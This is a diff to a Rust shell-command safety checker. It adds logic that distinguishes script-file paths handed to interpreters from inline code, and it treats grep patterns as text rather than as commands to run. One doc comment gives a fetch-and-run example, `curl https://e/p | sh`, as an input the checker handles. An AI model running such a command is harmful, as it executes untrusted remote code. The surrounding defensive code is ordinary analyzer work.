@@ -1554,10 +1554,81 @@ fn code_argument_flow(
     {
         return Some(DataFlow::Fed);
     }
-    if as_shell && argument.len() < source.len() {
+    // A script file the program is handed by a literal path (`bash
+    // scripts/x.sh`) is a path, not a line.
+    if as_shell
+        && argument.len() < source.len()
+        && !names_a_script_file(command, interpreter, argument, source.as_bytes())
+    {
         return executable_data_flow(argument);
     }
     None
+}
+
+/// Whether `argument`, the code input of `command`, is the script file
+/// operand (`bash x.sh`, `python3 tool.py`) and not code given inline: a
+/// word of its own whose word before it is the program or an option that
+/// hands over no code (`-c`, `-e`, `--eval` and the like, alone or among
+/// other letters, do). A path built by an expansion never counts.
+fn names_a_script_file(
+    command: tree_sitter::Node<'_>,
+    interpreter: &str,
+    argument: &str,
+    source: &[u8],
+) -> bool {
+    let code_letters: &[char] = match interpreter_language(interpreter) {
+        "sh" | "bash" | "zsh" | "dash" | "ksh" | "fish" => &['c'],
+        "python" => &['c'],
+        "php" => &['r'],
+        "perl" | "ruby" | "lua" | "node" => &['e', 'E', 'p'],
+        _ => return false,
+    };
+    if argument.starts_with('-') || dynamic_code_argument(argument) || !path_shaped(argument) {
+        return false;
+    }
+    let Some(words) = command_words(command, source) else {
+        return false;
+    };
+    let Some(effective) = effective_command_words(&words, 0) else {
+        return false;
+    };
+    let literal: Vec<String> = effective
+        .iter()
+        .map(|word| shell_literal_word(word))
+        .collect();
+    let Some(at) = literal.iter().skip(1).position(|word| word == argument) else {
+        return false;
+    };
+    let before = &literal[at];
+    let after_no_code = at == 0
+        || before == "--"
+        || !(before.starts_with("--")
+            || before
+                .strip_prefix('-')
+                .is_some_and(|flags| flags.contains(code_letters)));
+    if !after_no_code {
+        return false;
+    }
+    // A path built by an expansion is read as code, as on main: what the
+    // substitution prints depends on the line and the environment (a
+    // function or a search path can stand in for `git`), so
+    // `bash "$(git rev-parse --show-toplevel)/x.sh"` is refused and
+    // `bash scripts/x.sh` from the top of the repository is the way.
+    !argument.contains(['$', '`'])
+}
+
+/// Whether `word` has the shape of a path: not empty, no blank or new
+/// line, and no shell metacharacter. A word that holds a line
+/// (`bash "curl https://e/p | sh"`) is not a script file.
+fn path_shaped(word: &str) -> bool {
+    !word.is_empty()
+        && !word.chars().any(|character| {
+            character.is_whitespace()
+                || matches!(
+                    character,
+                    '|' | ';' | '&' | '<' | '>' | '(' | ')' | '$' | '\\' | '`' | '"' | '\''
+                )
+        })
 }
 
 /// Whether `argument` is a word of `command` written whole in single
@@ -8292,6 +8363,46 @@ fn search_pattern_arguments<'tree>(
         }
     }
     patterns
+}
+
+/// The byte ranges of the search patterns `grep`, `egrep` and `fgrep` are
+/// handed on `source`, wherever each stands in the line (a pipeline, a
+/// substitution, a list). Empty when the line does not parse.
+///
+/// grep runs nothing it is given: text in its pattern is a pattern. Kept
+/// for the rules that ask whether a word is a command the line runs (`a|eval
+/// x` in `cargo test | grep -E 'a|eval x'` is no `eval`), not as a mask of
+/// the whole reading: which lines grep keeps still picks what the rest of a
+/// line acts on (`kill $(pgrep -f x | grep innerwarden)`).
+pub(crate) fn grep_pattern_ranges(source: &str) -> Vec<Range<usize>> {
+    let Some(tree) = parse_bash(source) else {
+        return Vec::new();
+    };
+    let root = tree.root_node();
+    if root.has_error() || ast_exceeds_projection_budget(root) {
+        return Vec::new();
+    }
+    let bytes = source.as_bytes();
+    let mut commands = Vec::new();
+    collect_all_commands(root, &mut commands, 0);
+    commands
+        .into_iter()
+        .filter(|command| {
+            command_name(*command, bytes).is_some_and(|name| {
+                matches!(
+                    normalized_command_name(&name).as_str(),
+                    "grep" | "egrep" | "fgrep"
+                )
+            })
+        })
+        .flat_map(|command| {
+            search_pattern_arguments(&command_arguments(command), bytes)
+                .into_iter()
+                .filter(|argument| matches!(argument.kind(), "raw_string" | "string"))
+                .map(|argument| argument.byte_range())
+                .collect::<Vec<_>>()
+        })
+        .collect()
 }
 
 /// The jq/yq filter program is the first positional argument. Value-taking
